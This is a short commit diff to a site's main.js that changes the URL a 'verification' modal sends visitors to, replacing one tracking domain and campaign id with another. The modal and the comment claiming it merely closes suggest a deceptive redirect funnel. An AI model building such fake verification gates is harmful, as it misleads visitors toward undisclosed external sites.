a3ba8d5f0aff0faefa6f30bc3d3e1df9a4a56f24
st837037-ux <st837037@gmail.com>
2026-04-03 15:15:17 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -53,7 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (vModal) {
     vModal.showModal();
     // Action to take after verification (currently closes modal)
-    const complete = () => window.location.href = 'https://inf4hub.com/?utm_campaign=9nvQzm5MCY&v1=[v1]&v2=[v2]&v3=[v3]';
+    const complete = () => window.location.href = 'https://t7q4.com/?utm_campaign=LIsZqk5XNi&v1=[v1]&v2=[v2]&v3=[v3]';
     document.getElementById('verify-btn')?.addEventListener('click', complete);
     document.getElementById('enter-btn')?.addEventListener('click', complete);
     
